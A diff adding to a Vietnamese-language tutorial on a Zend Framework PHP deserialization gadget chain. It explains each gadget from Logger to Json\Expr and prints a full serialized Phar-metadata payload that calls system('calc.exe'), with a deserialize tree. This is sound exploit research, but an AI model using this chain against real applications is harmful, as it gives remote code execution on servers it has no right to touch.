@@ -309,6 +309,21 @@ namespace Zend\Json {
     }
 }
 ```
+Trong đó:
+
+- **Zend\Log\Logger** – Entry point của chuỗi POP, khi đối tượng `Logger` được unserialize, nó chứa mảng `writers`, trong đó phần tử đầu tiên là một `Zend\Log\Writer\Mail`. Attacker sẽ truyền vào 2 tham số `$function` ví dụ (`system`) và `$param` ví dụ (`calc.exe`).
+
+- **Zend\Log\Writer\Mail** – Một writer xử lý log qua email, tại đây kẻ tấn công gán một `Zend\Tag\Cloud` vào `numEntriesPerPriority[0]`, đảm bảo rằng chuỗi tiếp tục đến logic hiển thị tag mà không bị phá vỡ – đây là điểm gắn `Cloud` để dẫn đến decorator.
+
+- **Zend\Tag\Cloud** – Lớp hiển thị tag cloud (giao diện gắn tag động), giữ một `HtmlCloud` trong `tagDecorator` để định nghĩa cấu trúc HTML của tag; class này truyền tiếp object xuống `HtmlCloud`, vốn có thể render trực tiếp và do đó dễ bị gọi trong các template.
+
+- **Zend\Tag\Cloud\Decorator\HtmlCloud** – Dùng để render tag dưới dạng HTML, có thuộc tính `escaper` chứa đối tượng `Zend\Escaper\Escaper`; đây là điểm quan trọng vì trong quá trình escape dữ liệu, các callable trong `Escaper` sẽ có thể bị gọi, ví dụ qua filter logic.
+
+- **Zend\Escaper\Escaper** – Chứa logic bảo vệ chống XSS, trong đó `htmlAttrMatcher` là mảng gồm `[FilterChain, 'filter']`; khi được gọi như một callable hoặc trong context escape HTML attributes, phần tử đầu tiên của mảng sẽ bị gọi, dẫn đến `FilterChain`.
+
+- **Zend\Filter\FilterChain** – Quản lý chuỗi các filter áp dụng lên dữ liệu, ở đây được khởi tạo với `filters[0] = [Expr, '__toString']` để đảm bảo `Expr->__toString()` sẽ được thực thi khi filter chạy; `filters[1] = $function` là hàm thực tế (vd: `system`), đảm bảo payload được gọi hợp lệ.
+
+- **Zend\Json\Expr** – Lớp đơn giản dùng trong JSON để biểu diễn biểu thức JavaScript, chứa thuộc tính `expression = $param` – ví dụ `"calc.exe"`; khi `__toString()` bị gọi (do framework hoặc escaping logic), giá trị payload sẽ được trả về trực tiếp, gây thực thi nếu đi kèm `system(...)`.
 
 Đoạn chain để liên kết và thực thi các gadget trên
 ```php
@@ -331,3 +346,22 @@ class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
     }
 }
 ```
+
+Đoạn chain khi đã được serialize và được gán vào metadata của **Phar** file.
+```php
+O:15:"Zend\Log\Logger":1:{s:10:" * writers";a:1:{i:0;O:20:"Zend\Log\Writer\Mail":3:{s:15:" * eventsToMail";a:1:{i:0;i:0;}s:21:" * subjectPrependText";s:0:"";s:24:" * numEntriesPerPriority";a:1:{i:0;O:14:"Zend\Tag\Cloud":2:{s:7:" * tags";a:1:{i:0;s:0:"";}s:15:" * tagDecorator";O:34:"Zend\Tag\Cloud\Decorator\HtmlCloud":3:{s:12:" * separator";s:0:"";s:10:" * escaper";O:20:"Zend\Escaper\Escaper":1:{s:18:" * htmlAttrMatcher";a:2:{i:0;O:23:"Zend\Filter\FilterChain":1:{s:10:" * filters";O:13:"SplFixedArray":2:{i:0;a:2:{i:0;O:14:"Zend\Json\Expr":1:{s:13:" * expression";s:8:"calc.exe";}i:1;s:10:"__toString";}i:1;s:6:"system";}}i:1;s:6:"filter";}}s:11:" * htmlTags";a:1:{s:1:"h";a:1:{s:1:"a";s:1:"!";}}}}}}}}
+```
+
+**Deserialize tree**
+``` 
+Zend\Log\Logger
+└── writers[0] = Zend\Log\Writer\Mail
+    └── numEntriesPerPriority[0] = Zend\Tag\Cloud
+        └── tagDecorator = Zend\Tag\Cloud\Decorator\HtmlCloud
+            └── escaper = Zend\Escaper\Escaper
+                └── htmlAttrMatcher[0] = Zend\Filter\FilterChain
+                    └── filters[0] = [Zend\Json\Expr("calc.exe"), "__toString"]
+                    └── filters[1] = "system"
+```
+
+## 4.5. Debug
